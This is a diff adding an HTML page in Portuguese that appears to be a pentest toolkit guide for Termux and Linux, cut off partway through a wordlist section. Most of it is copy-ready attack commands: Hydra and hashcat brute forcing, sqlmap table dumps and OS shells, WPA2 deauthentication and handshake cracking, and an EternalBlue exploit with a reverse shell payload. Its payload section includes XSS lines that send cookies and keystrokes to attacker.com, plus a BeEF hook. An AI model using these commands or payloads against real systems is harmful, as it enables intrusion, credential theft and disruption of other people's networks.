+pkg install root-repo -y
+pkg install aircrack-ng -y
+
+# Macchanger
+pkg install macchanger -y
+
+# Nmap scripts para WiFi
+nmap --script broadcast-*
+
+# Para monitor mode precisa de:
+# 1. Android com root
+# 2. Kernel com suporte a monitor mode
+# 3. Adaptador WiFi externo via OTG<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <h2><i class="fas fa-code me-2"></i>Scripts Úteis para Termux</h2>
+
+                        <h3>Instalador Automático</h3>
+                        <pre class="code-block">#!/data/data/com.termux/files/usr/bin/bash
+# Salvar como install_tools.sh
+
+echo "[+] Atualizando pacotes..."
+pkg update && pkg upgrade -y
+
+echo "[+] Instalando ferramentas básicas..."
+pkg install python git nmap hydra sqlmap -y
+pkg install wget curl nano vim -y
+
+echo "[+] Instalando ferramentas OSINT..."
+git clone https://github.com/laramies/theHarvester.git
+git clone https://github.com/sherlock-project/sherlock.git
+
+echo "[+] Configurando ambiente..."
+termux-setup-storage
+echo "alias ll='ls -la'" >> ~/.bashrc
+echo "alias update='pkg update && pkg upgrade'" >> ~/.bashrc
+
+echo "[+] Instalação completa!"
+echo "Reinicie o Termux ou execute: source ~/.bashrc"<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <div class="warning-box">
+                            <i class="fas fa-exclamation-triangle"></i>
+                            <div>
+                                <strong>Limitações do Termux:</strong>
+                                <ul class="mb-0 mt-2">
+                                    <li>Sem acesso root por padrão (limita algumas ferramentas)</li>
+                                    <li>Performance limitada pelo hardware do Android</li>
+                                    <li>WiFi hacking requer root e hardware específico</li>
+                                    <li>Android pode matar processos em background</li>
+                                    <li>Algumas ferramentas precisam ser compiladas manualmente</li>
+                                </ul>
+                            </div>
+                        </div>
+
+                        <div class="success-box">
+                            <i class="fas fa-lightbulb"></i>
+                            <div>
+                                <strong>Dicas para Termux:</strong>
+                                <ul class="mb-0 mt-2">
+                                    <li>Use <code>termux-wake-lock</code> para evitar que o Android mate processos</li>
+                                    <li>Configure o teclado com <code>termux-reload-settings</code></li>
+                                    <li>Use <code>^C</code> para cancelar comandos</li>
+                                    <li>Deslize da esquerda para abrir o menu com teclas extras</li>
+                                    <li>Mantenha o Termux atualizado da F-Droid</li>
+                                </ul>
+                            </div>
+                        </div>
+
+                        <div class="d-flex justify-content-between mt-4">
+                            <button class="btn btn-outline-primary" onclick="navigateTo('home')">
+                                <i class="fas fa-arrow-left me-1"></i> Voltar
+                            </button>
+                            <button class="btn btn-primary" onclick="navigateTo('tools')">
+                                Ver Ferramentas <i class="fas fa-arrow-right ms-1"></i>
+                            </button>
+                        </div>
+                    </section>
+                </div>
+
+                <!-- LINUX -->
+                <div id="section-linux" class="section-hidden">
+                    <section class="content-card">
+                        <h1 class="content-title"><i class="fas fa-terminal me-3"></i>Linux</h1>
+
+                        <div class="info-box">
+                            <i class="fab fa-linux fa-2x"></i>
+                            <div>
+                                <strong>Ambiente Linux completo para pentest</strong>. Aqui referenciamos ao uso de terminal Linux em geral, preferencialmente em distribuições especializadas em segurança.
+                            </div>
+                        </div>
+
+                        <h2><i class="fas fa-desktop me-2"></i>Distribuições Recomendadas</h2>
+
+                        <div class="tutorial-grid">
+                            <div class="tutorial-card">
+                                <div class="tutorial-icon"><i class="fas fa-skull-crossbones"></i></div>
+                                <div class="tutorial-title">Kali Linux</div>
+                                <div class="tutorial-description">600+ ferramentas pré-instaladas. Padrão ouro.</div>
+                                <pre class="mt-2 mb-0" style="font-size:0.8rem;color:#ccc;">sudo apt update && sudo apt full-upgrade -y</pre>
+                            </div>
+                            <div class="tutorial-card">
+                                <div class="tutorial-icon"><i class="fas fa-parachute-box"></i></div>
+                                <div class="tutorial-title">Parrot OS</div>
+                                <div class="tutorial-description">Mais leve, foco em privacidade e forense.</div>
+                                <pre class="mt-2 mb-0" style="font-size:0.8rem;color:#ccc;">sudo apt install parrot-tools</pre>
+                            </div>
+                            <div class="tutorial-card">
+                                <div class="tutorial-icon"><i class="fas fa-dragon"></i></div>
+                                <div class="tutorial-title">BlackArch</div>
+                                <div class="tutorial-description">3000+ ferramentas. Para usuários avançados.</div>
+                                <pre class="mt-2 mb-0" style="font-size:0.8rem;color:#ccc;">pacman -S blackarch</pre>
+                            </div>
+                        </div>
+
+                        <h2><i class="fas fa-code me-2"></i>Instalação Manual de Ferramentas</h2>
+
+                        <h3>Metasploit Framework</h3>
+                        <pre class="code-block"># Kali/Debian/Ubuntu
+sudo apt install metasploit-framework -y
+
+# Arch/BlackArch
+sudo pacman -S metasploit
+
+# Iniciar (no Kali precisa iniciar PostgreSQL)
+sudo service postgresql start
+sudo msfdb init
+msfconsole
+
+# Atualizar
+sudo apt update && sudo apt install metasploit-framework<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <h3>Burp Suite Community</h3>
+                        <pre class="code-block"># Download
+wget "https://portswigger.net/burp/releases/download?product=community&version=2024.1&type=linux" -O burpsuite.sh
+
+# Instalar
+chmod +x burpsuite.sh
+sudo ./burpsuite.sh
+
+# Alternativa via apt (Kali)
+sudo apt install burpsuite -y
+
+# Executar
+burpsuite<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <h3>Wireshark</h3>
+                        <pre class="code-block"># Instalação
+sudo apt install wireshark -y
+
+# Configurar para executar sem root
+sudo dpkg-reconfigure wireshark-common
+sudo usermod -a -G wireshark $USER
+newgrp wireshark
+
+# Executar
+wireshark
+
+# Ou via terminal
+sudo tshark -i eth0<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <h2><i class="fas fa-cogs me-2"></i>Configuração do Ambiente</h2>
+
+                        <h3>Aliases e Funções Úteis</h3>
+                        <pre class="code-block"># Adicionar ao ~/.bashrc ou ~/.zshrc
+alias scan='sudo nmap -A -T4'
+alias ports='sudo netstat -tulpn'
+alias update='sudo apt update && sudo apt upgrade -y'
+alias install='sudo apt install -y'
+alias remove='sudo apt remove --purge'
+
+# Função para scan rápido
+function quickscan() {
+    sudo nmap -sS -T4 -Pn $1
+}
+
+# Função para verificar IP
+function myip() {
+    curl ifconfig.me
+    echo
+}
+
+# Função para directory brute force
+function dirbscan() {
+    dirb $1 /usr/share/wordlists/dirb/common.txt
+}<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <h3>Configurar ZSH + Oh My Zsh</h3>
+                        <pre class="code-block"># Instalar ZSH
+sudo apt install zsh -y
+
+# Instalar Oh My Zsh
+sh -c "$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)"
+
+# Tema recomendado para pentest
+git clone https://github.com/romkatv/powerlevel10k.git $ZSH_CUSTOM/themes/powerlevel10k
+
+# Configurar no ~/.zshrc:
+ZSH_THEME="powerlevel10k/powerlevel10k"
+
+# Plugins úteis
+git clone https://github.com/zsh-users/zsh-autosuggestions ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-autosuggestions
+git clone https://github.com/zsh-users/zsh-syntax-highlighting.git ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-syntax-highlighting
+
+# Adicionar plugins
+plugins=(git zsh-autosuggestions zsh-syntax-highlighting)
+
+# Recarregar
+source ~/.zshrc<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <h2><i class="fas fa-server me-2"></i>Virtualização e Containers</h2>
+
+                        <h3>Docker para Ferramentas</h3>
+                        <pre class="code-block"># Instalar Docker
+sudo apt install docker.io -y
+sudo systemctl enable docker
+sudo systemctl start docker
+
+# Adicionar usuário ao grupo docker
+sudo usermod -a -G docker $USER
+newgrp docker
+
+# Executar ferramentas via Docker
+docker run --rm -it vulnerables/web-dvwa
+docker run --rm -it kalilinux/kali-rolling
+docker run --rm -it owasp/zap2docker-stable<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <h3>VirtualBox para Laboratórios</h3>
+                        <pre class="code-block"># Instalar VirtualBox
+sudo apt install virtualbox virtualbox-ext-pack -y
+
+# Importar máquinas virtuais
+# 1. Download de VMs vulneráveis:
+#    - Metasploitable (https://sourceforge.net/projects/metasploitable/)
+#    - DVWA (Damn Vulnerable Web App)
+#    - OWASP Juice Shop
+
+# 2. Configurar rede em modo bridge ou host-only
+# 3. Clonar snapshots para testes<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <div class="success-box">
+                            <i class="fas fa-check-circle"></i>
+                            <div>
+                                <strong>Boas Práticas no Linux:</strong>
+                                <ul class="mb-0 mt-2">
+                                    <li>Sempre use snapshots antes de testes</li>
+                                    <li>Configure firewall (ufw/iptables)</li>
+                                    <li>Use VPN para anonimato</li>
+                                    <li>Mantenha backups de configurações</li>
+                                    <li>Documente seus passos</li>
+                                </ul>
+                            </div>
+                        </div>
+
+                        <div class="d-flex justify-content-between mt-4">
+                            <button class="btn btn-outline-primary" onclick="navigateTo('home')">
+                                <i class="fas fa-arrow-left me-1"></i> Voltar
+                            </button>
+                            <button class="btn btn-primary" onclick="navigateTo('tools')">
+                                Ver Ferramentas <i class="fas fa-arrow-right ms-1"></i>
+                            </button>
+                        </div>
+                    </section>
+                </div>
+
+                <!-- TOOLS -->
+                <div id="section-tools" class="section-hidden">
+                    <section class="content-card">
+                        <h1 class="content-title"><i class="fas fa-toolbox me-3"></i>Todas as Ferramentas</h1>
+
+                        <h2><i class="fas fa-search me-2"></i>OSINT & Recon</h2>
+                        <div class="tool-card">
+                            <div class="tool-name">theHarvester</div>
+                            <div class="tool-description">Coleta emails, subdomínios, hosts usando fontes públicas</div>
+                            <div class="mt-2">
+                                <span class="platform-badge me-2">Termux</span>
+                                <span class="platform-badge">Linux</span>
+                            </div>
+                            <pre class="code-block">theHarvester -d example.com -b all
+theHarvester -d example.com -l 500 -b google<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+                        </div>
+
+                        <div class="tool-card">
+                            <div class="tool-name">Sherlock</div>
+                            <div class="tool-description">Encontra contas em 300+ redes sociais por username</div>
+                            <div class="mt-2">
+                                <span class="platform-badge me-2">Termux</span>
+                                <span class="platform-badge">Linux</span>
+                            </div>
+                            <pre class="code-block">python3 sherlock username
+python3 sherlock --nsfw username1 username2<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+                        </div>
+
+                        <div class="tool-card">
+                            <div class="tool-name">Recon-ng</div>
+                            <div class="tool-description">Framework modular de reconhecimento web</div>
+                            <div class="mt-2">
+                                <span class="platform-badge">Linux</span>
+                            </div>
+                            <pre class="code-block">recon-ng
+marketplace install all
+modules search
+use recon/domains-hosts/brute_hosts<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+                        </div>
+
+                        <div class="tool-card">
+                            <div class="tool-name">PhoneInfoga</div>
+                            <div class="tool-description">Rastreamento avançado de números de telefone</div>
+                            <div class="mt-2">
+                                <span class="platform-badge me-2">Termux</span>
+                                <span class="platform-badge">Linux</span>
+                            </div>
+                            <pre class="code-block">phoneinfoga scan -n +5511999999999
+phoneinfoga scan -i input.txt<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+                        </div>
+
+                        <h2 class="mt-4"><i class="fas fa-hammer me-2"></i>Força Bruta & Cracking</h2>
+                        <div class="tool-card">
+                            <div class="tool-name">Hydra</div>
+                            <div class="tool-description">Brute force paralelo para 50+ protocolos</div>
+                            <div class="mt-2">
+                                <span class="platform-badge me-2">Termux</span>
+                                <span class="platform-badge">Linux</span>
+                            </div>
+                            <pre class="code-block"># SSH brute force
+hydra -l admin -P wordlist.txt ssh://192.168.1.1
+
+# FTP brute force
+hydra -L users.txt -P passwords.txt ftp://192.168.1.1
+
+# HTTP POST form
+hydra -l admin -P wordlist.txt 192.168.1.1 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+                        </div>
+
+                        <div class="tool-card">
+                            <div class="tool-name">John the Ripper</div>
+                            <div class="tool-description">Cracker de senhas offline (hashes)</div>
+                            <div class="mt-2">
+                                <span class="platform-badge me-2">Termux</span>
+                                <span class="platform-badge">Linux</span>
+                            </div>
+                            <pre class="code-block"># Modo wordlist
+john --wordlist=rockyou.txt hashes.txt
+
+# Modo incremental
+john --incremental hashes.txt
+
+# Mostrar senhas crackeadas
+john --show hashes.txt
+
+# Crackear shadow file
+unshadow passwd.txt shadow.txt > unshadowed.txt
+john unshadowed.txt<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+                        </div>
+
+                        <div class="tool-card">
+                            <div class="tool-name">Hashcat</div>
+                            <div class="tool-description">Cracker de senhas mais rápido (usa GPU)</div>
+                            <div class="mt-2">
+                                <span class="platform-badge me-2">Termux</span>
+                                <span class="platform-badge">Linux</span>
+                            </div>
+                            <pre class="code-block"># MD5 brute force
+hashcat -m 0 -a 3 hashes.txt ?a?a?a?a?a?a
+
+# Wordlist + rules
+hashcat -m 0 -a 0 hashes.txt wordlist.txt -r rules/best64.rule
+
+# WPA2 cracking
+hashcat -m 2500 -a 0 capture.hccapx wordlist.txt<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+                        </div>
+
+                        <h2 class="mt-4"><i class="fas fa-network-wired me-2"></i>Rede & Scanning</h2>
+                        <div class="tool-card">
+                            <div class="tool-name">Nmap</div>
+                            <div class="tool-description">Scanner de rede e portas mais popular</div>
+                            <div class="mt-2">
+                                <span class="platform-badge me-2">Termux</span>
+                                <span class="platform-badge">Linux</span>
+                            </div>
+                            <pre class="code-block"># Scan básico
+nmap 192.168.1.1
+
+# Scan agressivo
+nmap -A -T4 192.168.1.1
+
+# Scan de todas as portas
+nmap -p- 192.168.1.1
+
+# Scan UDP
+nmap -sU 192.168.1.1
+
+# Scan de rede completa
+nmap 192.168.1.0/24
+
+# Scan com scripts NSE
+nmap --script vuln 192.168.1.1<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+                        </div>
+
+                        <div class="tool-card">
+                            <div class="tool-name">Masscan</div>
+                            <div class="tool-description">Scanner de portas mais rápido da Internet</div>
+                            <div class="mt-2">
+                                <span class="platform-badge">Linux</span>
+                            </div>
+                            <pre class="code-block"># Scan rápido
+masscan 192.168.1.0/24 -p80,443,22,21
+
+# Scan de toda internet em uma porta
+masscan 0.0.0.0/0 -p80 --rate=100000
+
+# Output em formato nmap
+masscan 192.168.1.1/24 -p1-65535 -oX scan.xml<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+                        </div>
+
+                        <div class="tool-card">
+                            <div class="tool-name">Netcat</div>
+                            <div class="tool-description">Ferramenta de rede versátil</div>
+                            <div class="mt-2">
+                                <span class="platform-badge me-2">Termux</span>
+                                <span class="platform-badge">Linux</span>
+                            </div>
+                            <pre class="code-block"># Escutar porta
+nc -lvnp 4444
+
+# Conectar
+nc 192.168.1.1 80
+
+# Banner grabbing
+echo "" | nc 192.168.1.1 22
+
+# Transferência de arquivos
+# Receptor: nc -lvnp 4444 > arquivo.txt
+# Enviador: nc 192.168.1.1 4444 < arquivo.txt<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+                        </div>
+
+                        <h2 class="mt-4"><i class="fas fa-wifi me-2"></i>Wireless</h2>
+                        <div class="tool-card">
+                            <div class="tool-name">Aircrack-ng</div>
+                            <div class="tool-description">Suite completa para WiFi (WEP/WPA/WPA2)</div>
+                            <div class="mt-2">
+                                <span class="platform-badge">Linux</span>
+                            </div>
+                            <pre class="code-block"># Modo monitor
+airmon-ng start wlan0
+
+# Capturar handshake
+airodump-ng wlan0mon
+airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
+
+# Deauthentication attack
+aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon
+
+# Crack WPA
+aircrack-ng -w wordlist.txt capture.cap<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+                        </div>
+
+                        <div class="tool-card">
+                            <div class="tool-name">Wifite</div>
+                            <div class="tool-description">Automação de ataques WiFi</div>
+                            <div class="mt-2">
+                                <span class="platform-badge">Linux</span>
+                            </div>
+                            <pre class="code-block"># Scan e ataque automático
+sudo wifite
+
+# Ataque específico
+sudo wifite --wpa --kill
+
+# Apenas scan
+sudo wifite --showb<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+                        </div>
+
+                        <h2 class="mt-4"><i class="fas fa-globe me-2"></i>Web Security</h2>
+                        <div class="tool-card">
+                            <div class="tool-name">SQLMap</div>
+                            <div class="tool-description">Automação de SQL Injection</div>
+                            <div class="mt-2">
+                                <span class="platform-badge me-2">Termux</span>
+                                <span class="platform-badge">Linux</span>
+                            </div>
+                            <pre class="code-block"># Teste básico
+sqlmap -u "http://site.com/page?id=1"
+
+# Listar databases
+sqlmap -u "http://site.com/page?id=1" --dbs
+
+# Dump de tabela
+sqlmap -u "http://site.com/page?id=1" -D dbname -T users --dump
+
+# POST request
+sqlmap -u "http://site.com" --data="user=admin&pass=admin"
+
+# Bypass WAF
+sqlmap -u "http://site.com" --tamper=space2comment,charencode<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+                        </div>
+
+                        <div class="tool-card">
+                            <div class="tool-name">Nikto</div>
+                            <div class="tool-description">Scanner de vulnerabilidades em servidores web</div>
+                            <div class="mt-2">
+                                <span class="platform-badge me-2">Termux</span>
+                                <span class="platform-badge">Linux</span>
+                            </div>
+                            <pre class="code-block"># Scan básico
+nikto -h http://example.com
+
+# Scan com output
+nikto -h http://example.com -o result.html -F html
+
+# Scan múltiplos hosts
+nikto -h hosts.txt
+
+# Scan com autenticação
+nikto -h http://example.com -id admin:password<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+                        </div>
+
+                        <div class="tool-card">
+                            <div class="tool-name">DirBuster/Dirsearch</div>
+                            <div class="tool-description">Brute force de diretórios e arquivos</div>
+                            <div class="mt-2">
+                                <span class="platform-badge me-2">Termux</span>
+                                <span class="platform-badge">Linux</span>
+                            </div>
+                            <pre class="code-block"># Dirsearch
+python3 dirsearch.py -u http://example.com -e php,html,txt
+
+# Dirb
+dirb http://example.com /usr/share/wordlists/dirb/common.txt
+
+# Gobuster
+gobuster dir -u http://example.com -w wordlist.txt<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+                        </div>
+
+                        <div class="tool-card">
+                            <div class="tool-name">XSStrike</div>
+                            <div class="tool-description">Detector avançado de XSS</div>
+                            <div class="mt-2">
+                                <span class="platform-badge me-2">Termux</span>
+                                <span class="platform-badge">Linux</span>
+                            </div>
+                            <pre class="code-block"># Scan básico
+python3 xsstrike.py -u "http://site.com/page?q=test"
+
+# Scan com crawler
+python3 xsstrike.py -u "http://site.com" --crawl
+
+# Teste personalizado
+python3 xsstrike.py -u "http://site.com" -d "param=test"<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+                        </div>
+
+                        <h2 class="mt-4"><i class="fas fa-crosshairs me-2"></i>Exploitation</h2>
+                        <div class="tool-card">
+                            <div class="tool-name">Metasploit Framework</div>
+                            <div class="tool-description">Framework de exploração mais completo</div>
+                            <div class="mt-2">
+                                <span class="platform-badge">Linux</span>
+                            </div>
+                            <pre class="code-block"># Iniciar
+msfconsole
+
+# Buscar exploits
+search type:exploit platform:windows
+
+# Usar um exploit
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 192.168.1.1
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.1.100
+exploit
+
+# Pós-exploração
+meterpreter > sysinfo
+meterpreter > shell<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+                        </div>
+
+                        <div class="tool-card">
+                            <div class="tool-name">Searchsploit</div>
+                            <div class="tool-description">Banco de dados de exploits local</div>
+                            <div class="mt-2">
+                                <span class="platform-badge">Linux</span>
+                            </div>
+                            <pre class="code-block"># Buscar exploits
+searchsploit apache 2.4
+searchsploit wordpress 5.0
+
+# Copiar exploit
+searchsploit -m 42315
+
+# Atualizar database
+searchsploit -u<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+                        </div>
+
+                        <div class="tool-card">
+                            <div class="tool-name">BeEF</div>
+                            <div class="tool-description">Browser Exploitation Framework</div>
+                            <div class="mt-2">
+                                <span class="platform-badge">Linux</span>
+                            </div>
+                            <pre class="code-block"># Iniciar
+beef-xss
+
+# Acessar painel: http://127.0.0.1:3000/ui/panel
+# Credenciais padrão: beef/beef
+
+# Hook browser com:
+<script src="http://your-ip:3000/hook.js"></script><button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+                        </div>
+
+                        <h2 class="mt-4"><i class="fas fa-user-secret me-2"></i>Anonimato & Privacidade</h2>
+                        <div class="tool-card">
+                            <div class="tool-name">Tor</div>
+                            <div class="tool-description">Rede de anonimato</div>
+                            <div class="mt-2">
+                                <span class="platform-badge me-2">Termux</span>
+                                <span class="platform-badge">Linux</span>
+                            </div>
+                            <pre class="code-block"># Instalar
+pkg install tor  # Termux
+sudo apt install tor  # Linux
+
+# Iniciar
+tor
+
+# Usar com curl
+curl --socks5 127.0.0.1:9050 ifconfig.me
+
+# Alterar identidade
+sudo kill -HUP $(pgrep tor)<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+                        </div>
+
+                        <div class="tool-card">
+                            <div class="tool-name">ProxyChains</div>
+                            <div class="tool-description">Encadeamento de proxies</div>
+                            <div class="mt-2">
+                                <span class="platform-badge">Linux</span>
+                            </div>
+                            <pre class="code-block"># Configurar /etc/proxychains.conf
+# Adicionar: socks5 127.0.0.1 9050
+
+# Usar
+proxychains nmap 192.168.1.1
+proxychains firefox
+
+# Scan através de tor
+proxychains nmap -sT -Pn 192.168.1.1<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+                        </div>
+
+                        <div class="d-flex justify-content-between mt-4">
+                            <button class="btn btn-outline-primary" onclick="navigateTo('home')">
+                                <i class="fas fa-arrow-left me-1"></i> Voltar
+                            </button>
+                        </div>
+                    </section>
+                </div>
+
+                <!-- TUTORIAIS -->
+                <div id="section-tutorials" class="section-hidden">
+                    <section class="content-card">
+                        <h1 class="content-title"><i class="fas fa-book me-3"></i>Tutoriais Práticos</h1>
+
+                        <h2><i class="fas fa-search me-2"></i>OSINT Básico</h2>
+                        <div class="tool-card">
+                            <div class="tool-name">Tutorial: Coleta de Informações</div>
+                            <div class="tool-description">Passo a passo para coleta de informações públicas</div>
+                            <h4 class="mt-3">Passo 1: Coleta de Emails</h4>
+                            <pre class="code-block">theHarvester -d alvo.com -b google,bing,linkedin
+theHarvester -d alvo.com -l 1000 -b all<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                            <h4>Passo 2: Busca por Subdomínios</h4>
+                            <pre class="code-block"># Com subfinder
+subfinder -d alvo.com
+
+# Com assetfinder
+assetfinder --subs-only alvo.com
+
+# Com amass
+amass enum -d alvo.com<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                            <h4>Passo 3: Verificação de Vazamentos</h4>
+                            <pre class="code-block"># Verificar email em vazamentos
+holehe email@alvo.com
+
+# Verificar username
+sherlock username
+
+# Verificar telefone
+phoneinfoga scan -n +5511999999999<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+                        </div>
+
+                        <h2 class="mt-4"><i class="fas fa-network-wired me-2"></i>Enumeração de Rede</h2>
+                        <div class="tool-card">
+                            <div class="tool-name">Tutorial: Scan Completo</div>
+                            <div class="tool-description">Enumeração completa de uma rede/alvo</div>
+
+                            <h4 class="mt-3">Fase 1: Descoberta de Hosts</h4>
+                            <pre class="code-block"># Ping sweep
+nmap -sn 192.168.1.0/24
+
+# Ou mais rápido
+fping -a -g 192.168.1.0/24 2>/dev/null
+
+# Com masscan
+masscan 192.168.1.0/24 -p80,443 --rate=1000<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                            <h4>Fase 2: Scan de Portas</h4>
+                            <pre class="code-block"># Scan rápido das 1000 portas mais comuns
+nmap -T4 192.168.1.1
+
+# Scan de todas as portas
+nmap -p- 192.168.1.1
+
+# Scan agressivo com scripts
+nmap -A -T4 192.168.1.1<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                            <h4>Fase 3: Detecção de Serviços</h4>
+                            <pre class="code-block"># Detecção de versões
+nmap -sV 192.168.1.1
+
+# Scan UDP
+nmap -sU -p 53,67,68,69,123,161 192.168.1.1
+
+# Scripts NSE específicos
+nmap --script=http-enum 192.168.1.1
+nmap --script=smb-enum-shares 192.168.1.1<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+                        </div>
+
+                        <h2 class="mt-4"><i class="fas fa-database me-2"></i>SQL Injection Prático</h2>
+                        <div class="tool-card">
+                            <div class="tool-name">Tutorial: Testando SQLi</div>
+                            <div class="tool-description">Passo a passo para identificar e explorar SQL Injection</div>
+
+                            <h4 class="mt-3">Passo 1: Identificação</h4>
+                            <pre class="code-block"># Testar parâmetros
+http://alvo.com/page?id=1'
+http://alvo.com/page?id=1"
+http://alvo.com/page?id=1 AND 1=1
+http://alvo.com/page?id=1 AND 1=2<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                            <h4>Passo 2: Exploração Manual</h4>
+                            <pre class="code-block"># Determinar número de colunas
+ORDER BY 1--
+ORDER BY 2--
+ORDER BY 3--
+# Continua até dar erro
+
+# Union-based
+UNION SELECT 1,2,3--
+UNION SELECT null,version(),user()--<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                            <h4>Passo 3: Automatizar com SQLMap</h4>
+                            <pre class="code-block"># Teste básico
+sqlmap -u "http://alvo.com/page?id=1"
+
+# Listar databases
+sqlmap -u "http://alvo.com/page?id=1" --dbs
+
+# Dump de dados
+sqlmap -u "http://alvo.com/page?id=1" -D database -T users --dump
+
+# Shell
+sqlmap -u "http://alvo.com/page?id=1" --os-shell<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+                        </div>
+
+                        <h2 class="mt-4"><i class="fas fa-wifi me-2"></i>WiFi Pentest Básico</h2>
+                        <div class="tool-card">
+                            <div class="tool-name">Tutorial: Capturando Handshake WPA2</div>
+                            <div class="tool-description">Como capturar e crackear handshake WPA2</div>
+
+                            <h4 class="mt-3">Passo 1: Preparar Interface</h4>
+                            <pre class="code-block"># Verificar interfaces
+airmon-ng
+
+# Colocar em modo monitor
+airmon-ng start wlan0
+
+# Verificar se está em monitor
+iwconfig<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                            <h4>Passo 2: Escanear Redes</h4>
+                            <pre class="code-block"># Escanear redes próximas
+airodump-ng wlan0mon
+
+# Focar em uma rede específica
+airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                            <h4>Passo 3: Capturar Handshake</h4>
+                            <pre class="code-block"># Deauthentication attack para forçar handshake
+aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF -c client_mac wlan0mon
+
+# Aguardar handshake aparecer no airodump
+# Look for: "WPA handshake: AA:BB:CC:DD:EE:FF"<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                            <h4>Passo 4: Crackear Senha</h4>
+                            <pre class="code-block"># Com aircrack
+aircrack-ng -w rockyou.txt capture.cap
+
+# Com hashcat
+hcxpcapngtool -o hash.hc22000 capture.cap
+hashcat -m 22000 hash.hc22000 rockyou.txt<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+                        </div>
+
+                        <div class="d-flex justify-content-between mt-4">
+                            <button class="btn btn-outline-primary" onclick="navigateTo('home')">
+                                <i class="fas fa-arrow-left me-1"></i> Voltar
+                            </button>
+                        </div>
+                    </section>
+                </div>
+
+                <!-- TEMPLATES -->
+                <div id="section-templates" class="section-hidden">
+                    <section class="content-card">
+                        <h1 class="content-title"><i class="fas fa-download me-3"></i>Templates & Payloads</h1>
+
+                        <h2><i class="fas fa-code me-2"></i>Payloads XSS</h2>
+                        <div class="tool-card">
+                            <div class="tool-name">XSS Básico</div>
+                            <pre class="code-block">&lt;script&gt;alert('XSS')&lt;/script&gt;
+&lt;img src=x onerror=alert(1)&gt;
+&lt;svg onload=alert(1)&gt;
+&lt;body onload=alert('XSS')&gt;
+&lt;iframe src="javascript:alert('XSS')"&gt;<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+                        </div>
+
+                        <div class="tool-card">
+                            <div class="tool-name">XSS Avançado</div>
+                            <pre class="code-block"># Steal cookies
+&lt;script&gt;document.location='http://attacker.com/?c='+document.cookie&lt;/script&gt;
+
+# Keylogger
+&lt;script&gt;document.onkeypress=function(e){fetch('http://attacker.com/?k='+e.key)}&lt;/script&gt;
+
+# BeEF hook
+&lt;script src="http://attacker:3000/hook.js"&gt;&lt;/script&gt;<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+                        </div>
+
+                        <div class="tool-card">
+                            <div class="tool-name">XSS em Atributos</div>
+                            <pre class="code-block">&lt;input type="text" value="" onfocus="alert(1)" autofocus&gt;
+&lt;img src="x" onerror="alert(1)"&gt;
+&lt;details open ontoggle="alert(1)"&gt;
+&lt;video&gt;&lt;source onerror="alert(1)"&gt;<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+                        </div>
+
+                        <h2 class="mt-4"><i class="fas fa-key me-2"></i>Wordlists</h2>
+                        <div class="tool-card">
+                            <div class="tool-name">Baixar Wordlists Comuns</div>
+                            <pre class="code-block"># RockYou (Termux/Linux)
+wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
+
+# Seclists
+git clone https://github.com/danielmiessler/SecLists.git
+
+# Wordlists personalizadas do Kali
